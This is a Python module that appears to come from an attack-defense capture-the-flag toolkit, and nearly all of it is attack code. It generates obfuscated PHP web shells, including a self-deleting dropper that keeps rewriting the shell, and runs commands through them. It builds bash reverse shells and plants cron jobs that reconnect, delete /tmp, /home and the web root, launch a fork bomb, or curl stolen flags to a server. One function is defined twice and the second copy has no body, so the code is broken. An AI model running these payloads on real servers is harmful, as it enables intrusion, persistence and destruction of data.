#!/usr/bin/env python

from http import http
from config import *
import hashlib
import base64
from string import maketrans
import requests
from urllib import quote
import readline
import utils.log
from random import randint

Log = utils.log.Log() 
user_agents = open('data/ua.data').readlines()

def rot13(text):
    rot13trans = maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')
    return text.translate(rot13trans)

def dump_error(e,target="",load_script=""):
    if not target and not load_script:
        return Log.error(str(e))
    Log.error("[error] fail to attack: " + target + " with error: " + str(e) \
    + " with the script: " + load_script)

def dump_warning(e,target="",load_script=""):
    if not target and not load_script:
        return Log.warning(str(e))
    Log.warning("[warning] fail to attack: " + target + " with error: " + str(e) \
    + " with the script: " + load_script)

def dump_success(info,target="",load_script=""):
    if not target and not load_script:
        return Log.success(str(info))
    Log.success("[success] success to " + info + " from " + target + " with the script:"\
    + load_script)

def res_filter(res):
    index_1 = res.find(cmd_prefix) + len(cmd_prefix)
    index_2 = res.find(cmd_postfix)
    if index_1 >=0 and index_2 >=0:
        res = res[index_1:index_2]
    else:
        return "can not find the cmd_split in your output"
    return res

def random_ua():
    global headers
    length = len(user_agents)
    rand = randint(0,length-1)
    return user_agents[rand].strip("\n")
    
def execute_shell(target,target_port,cmd):
    if shell_type==1 or shell_type==2:
	shell_name = "." + hashlib.md5(shell_salt + target).hexdigest() + ".php"
	shell_arg = hashlib.md5(shell_salt_2 + target).hexdigest()
	c_1 = "system"
	c_2 = cmd + ";"
	c_1 = rot13(base64.b64encode(c_1))
	c_2 = rot13(base64.b64encode(c_2))
	c_1 = c_1.replace('+','%2B')
	c_2 = c_2.replace('+','%2B')
	data = "a=" + c_1 + "&" + "b=" + c_2 + "&" + "hash=" + shell_arg
	print "payload => " + data
	try:
	    res = http("post",target,target_port,shell_path + "/" +  shell_name ,data,headers)
	except Exception,e:
	    dump_error(e,target,"function.py execute_shell")
	    return "error occurs"
	return res

def check_shell(target,target_port,cmd):
    shell_name = "." + hashlib.md5(shell_salt + target).hexdigest() + ".php"
    shell_arg = hashlib.md5(shell_salt_2 + target).hexdigest()
    #print res
    if shell_type==1:
	res = execute_shell(target,target_port,"echo hell0W0r1d")
	if "hell0W0r1d" in res:
	    return True
	return False    
    if shell_type==2:
	return visit_shell(target,target_port,"")
    return True

def visit_shell(target,target_port,cmd):
    shell_name = "." + hashlib.md5(shell_salt + target).hexdigest() + ".php"
    shell_arg = hashlib.md5(shell_salt_2 + target).hexdigest()
    res = requests.get("http://" + target + ":" + str(target_port) + shell_path + "/"  + shell_name,timeout=2)
    if res.status_code==200:
	res.close()
	return True
    res.close()
    return False

def upload_and_execute(target,target_port,cmd):
    global U_A_E_flag, upload_file_name, executor
    if not U_A_E_flag:
        upload_file_name = raw_input('The file to upload:')
	executor = raw_input('The executor:')
	U_A_E_flag = 1
    contents = open(upload_file_name).read()
    contents = base64.b64encode(contents)
    cmd = '/bin/echo %s | /usr/bin/base64 -d | /bin/cat > %s/%s'%(contents , shell_absolute_path , upload_file_name)
    cmd += ';' + executor
    return cmd

def generate_shell(target,target_port,cmd):
    shell_name = "." + hashlib.md5(shell_salt + target).hexdigest() + ".php"
    shell_arg = hashlib.md5(shell_salt_2 + target).hexdigest()
    if shell_type==1: 
	shell = '<?php if($_REQUEST[hash]=="%s"){$c_1 = base64_decode(str_rot13($_REQUEST[a]));$c_2 = base64_decode(str_rot13($_REQUEST[b]));$c_1($c_2);}?>'%shell_arg
    if shell_type==2:
	shell = """<?php
	ignore_user_abort(true);
        set_time_limit(0);
	$file = "%s";
        $shell = '<?php if($_REQUEST[hash]=="%s"){$c_1 = base64_decode(str_rot13($_REQUEST[a]));$c_2 = base64_decode(str_rot13($_REQUEST[b]));$c_1($c_2);}?>';
	unlink(__FILE__);
        while (TRUE) {{
	if (file_get_contents($file)!==$shell) {{ file_put_contents($file, $shell); }}
        usleep(5);
	}}
	?>"""%(shell_name,shell_arg)
	visit_shell(target,target_port,'')
    return shell_name,shell,base64.b64encode(shell)

def get_shell(target,target_port,cmd):
    shell_name,shell,encode_shell = generate_shell(target,target_port,cmd)
    return  "/bin/echo " + quote(encode_shell) + " | /usr/bin/base64 -d | /bin/cat > " + shell_absolute_path + "/" + shell_name 

def get_flag(target,target_port,cmd):
    return "/bin/cat " + flag_path

def rm_file_index(target,target_port,cmd):
    return "/bin/rm " + " -rf /var/www/html/index.php"

def rm_file(target,target_port,cmd):
    return "/bin/rm " + " -rf /var/www/html"

def reverse_shell(target,target_port,cmd):
    cmd = '/bin/bash -i >& /dev/tcp/%s/%d 0>&1'%(reverse_ip , reverse_port)
    cmd = base64.b64encode(cmd)
    cmd = '/bin/echo %s | /usr/bin/base64 -d | /bin/bash'%cmd
    return cmd

def crontab_reverse(target,target_port,cmd):
    cmd = 'bash -i >& /dev/tcp/%s/%d 0>&1'%(reverse_ip , reverse_port)
    crontab_cmd = "* * * * * bash -c '%s'\n"%cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf"+ " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    print cmd
    return cmd 

def crontab_rm(target,target_port,cmd):
    cmd = '/bin/rm -rf /tmp/* /home/* /var/www/html/*'
    crontab_cmd = "* * * * * %s\n"%cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    print cmd
    return cmd


def crontab_shellbomb(target,target_port,cmd):
    cmd = "/bin/echo '.() { .|.& } && .' > /tmp/aaa;/bin/bash /tmp/aaa;"
    crontab_cmd = "* * * * * %s\n"%cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat > " + crontab_path + "/tmp.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    print cmd
    return cmd

def crontab_flag_ip(target,target_port,cmd):
    cmd = '/usr/bin/curl "http://%s:%s/%s" -d "token=%s"' %(flag_server,flag_port,flag_url,flag_token)
    crontab_cmd = "* * * * * %s\n"%cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    print cmd
    return cmd

def crontab_rm(target,target_port,cmd):

#check wether the format of a flag is correct, suppose the format of a flag must be a string with hex value
def check_flag(flag):
    flag = flag.replace(" ","").replace("\n","")
    for char in flag:
        if (char<"0" or char>"9") and (char>"f" or char<"a"):
            return False
    return True


